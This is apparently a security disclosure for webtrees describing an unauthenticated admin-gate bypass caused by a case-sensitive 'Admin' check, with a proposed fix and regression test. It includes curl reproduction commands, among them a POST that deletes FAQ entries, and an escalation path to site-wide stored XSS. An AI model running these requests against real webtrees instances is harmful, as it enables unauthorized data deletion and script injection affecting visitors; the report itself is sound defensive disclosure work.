<!-- SPDX-License-Identifier: GPL-3.0-or-later -->

# SEC-AUDIT-005 — Case-Insensitive Admin-Gate Bypass in ModuleAction

## Summary

| Field | Value |
|---|---|
| **Affected file** | `app/Http/RequestHandlers/ModuleAction.php` (line 75) |
| **Affected version** | webtrees `main` at commit `c338276a5a` (post-2.2.5) and all prior versions containing the `str_contains` gate |
| **CWE** | CWE-287 (Improper Authentication), CWE-178 (Improper Handling of Case Sensitivity) |
| **Initial severity estimate** | **High** (default install) / **Critical** (with custom-css-js module) |
| **CVSS 3.1 estimate** | 8.1 High (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H) default; 9.4 Critical with custom-css-js |
| **Required privilege** | **None** — unauthenticated visitor, no session or CSRF token required |
| **Mitigating factor** | None in default install. The bypass is trivial and requires no special tooling. |

> **Note:** This is an initial severity estimate by the reporter. Final classification is at the maintainer's discretion.

## Description

`ModuleAction::handle()` uses a case-sensitive string check as the admin-only gate:

```php
if (str_contains($action, 'Admin') && !Auth::isAdmin($user)) {
    throw new HttpAccessDeniedException('Admin only action');
}
```

PHP method dispatch (`method_exists()` and `$module->$method()`) is **case-insensitive**. A URL like `/module/faq/adminedit` (all lowercase) bypasses the `str_contains($action, 'Admin')` check because `'adminedit'` does not contain the exact substring `'Admin'` (capital A). However, PHP still resolves `$module->getAdmineditAction()` to `$module->getAdminEditAction()` because PHP method names are case-insensitive.

This means **any unauthenticated visitor** can invoke admin-only module actions by using a lowercase (or other non-matching case) variant of the action name in the URL.

### Confirmed exploitable actions in default install

| Module | Action URL | Effect |
|---|---|---|
| FAQ | `/module/faq/adminedit` | Access admin FAQ edit form |
| FAQ | `/module/faq/admindelete` (POST) | Delete FAQ entries |
| Stories | `/module/stories/admindelete` (POST) | Delete story entries |
| Relationships Chart | `/module/relationships_chart/admin` | Access admin preferences |

### Critical escalation with custom-css-js module

The bundled `custom-css-js` module allows administrators to inject arbitrary CSS and JavaScript into every page. If this module is enabled, an unauthenticated attacker can use the case bypass to:

1. Access the admin form: `GET /module/custom-css-js/admin`
2. Submit arbitrary JavaScript: `POST /module/custom-css-js/adminsave`

This results in **stored XSS on every page** served by the webtrees instance, affecting all visitors.

## Reproduction Steps

### Prerequisites

- A webtrees instance at `$BASE_URL` with the FAQ module enabled (enabled by default)
- **No authentication required**

### Step 1: Verify the bypass (FAQ admin form)

```bash
# This should be blocked (returns 403 or redirect to login):
curl -v "$BASE_URL/index.php?route=/module/faq/Admin&tree=tree1"

# This bypasses the gate (returns 200 with the admin form):
curl -v "$BASE_URL/index.php?route=/module/faq/admin&tree=tree1"
```

**Before fix:** The second request returns HTTP 200 with the FAQ admin edit form HTML.

**After fix:** Both requests return HTTP 403 (`HttpAccessDeniedException`).

### Step 2: Additional casing variants

All of the following bypass the gate:

```bash
# All lowercase
curl -v "$BASE_URL/index.php?route=/module/faq/admin&tree=tree1"

# All uppercase
curl -v "$BASE_URL/index.php?route=/module/faq/ADMIN&tree=tree1"

# Mixed case (but not matching 'Admin' exactly)
curl -v "$BASE_URL/index.php?route=/module/faq/AdMiN&tree=tree1"

# Lowercase with suffix
curl -v "$BASE_URL/index.php?route=/module/faq/adminedit&tree=tree1"

# Lowercase delete (POST)
curl -X POST -v "$BASE_URL/index.php?route=/module/faq/admindelete&tree=tree1" \
  -d "block_id=1"
```

### Step 3: Destructive action (FAQ delete)

```bash
# Delete a FAQ entry without any authentication
curl -X POST "$BASE_URL/index.php?route=/module/faq/admindelete&tree=tree1" \
  -d "block_id=1"
```

**Before fix:** The FAQ entry is deleted. HTTP 302 redirect response.

**After fix:** HTTP 403 Forbidden.

## Fix

The fix consists of two commits (see attached patches):

1. **`0001-Add-regression-test-for-case-insensitive-admin-gate-.patch`** — data-provider test with 6 casing variants. All must raise `HttpAccessDeniedException`. 5 of 6 variants fail on unfixed code.

2. **`0002-Close-case-insensitive-admin-gate-bypass-in-ModuleAc.patch`** — replaces `str_contains($action, 'Admin')` with `stripos($action, 'Admin') !== false` for case-insensitive matching. This is a minimal 1-line fix.

### Recommended additional hardening

As a defense-in-depth measure, consider adding explicit `Auth::checkAdminOrException()` calls inside each `post*Admin*Action()` and `get*Admin*Action()` method in the bundled modules. This would provide a second gate that does not rely on URL-level string matching.

## Included Files

| File | Description |
|---|---|
| `0001-Add-regression-test-for-case-insensitive-admin-gate-.patch` | Regression test (6 casing variants) |
| `0002-Close-case-insensitive-admin-gate-bypass-in-ModuleAc.patch` | Fix: case-insensitive gate check |
